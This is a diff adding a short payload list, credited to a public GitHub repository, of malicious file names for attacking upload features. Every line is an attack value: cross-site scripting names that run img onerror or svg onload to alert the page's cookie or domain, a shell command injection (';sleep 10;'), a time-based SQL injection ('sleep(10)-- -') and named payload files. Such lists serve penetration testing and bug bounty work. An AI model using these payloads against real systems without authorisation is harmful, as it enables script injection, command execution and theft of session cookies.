@@ -1,0 +1,14 @@
+Credits to https://github.com/coffinxp/img-payloads
+@coffinxp
+
+"><img src=x onerror=alert(document.cookie)>.jpg
+;sleep 10;.jpg
+<img src=x onerror=alert(document.cookie)>.png
+<img src=x onerror=alert(document.domain)>.jpg
+<img src=x onerror=alert(document.domain)>.png
+<svg onload=alert(document.cookie)>.jpg
+<svg onload=alert(document.domain)>.jpg
+coffinxss.svg
+lostsec.png
+sleep(10)-- -.jpg
+xss.jpg
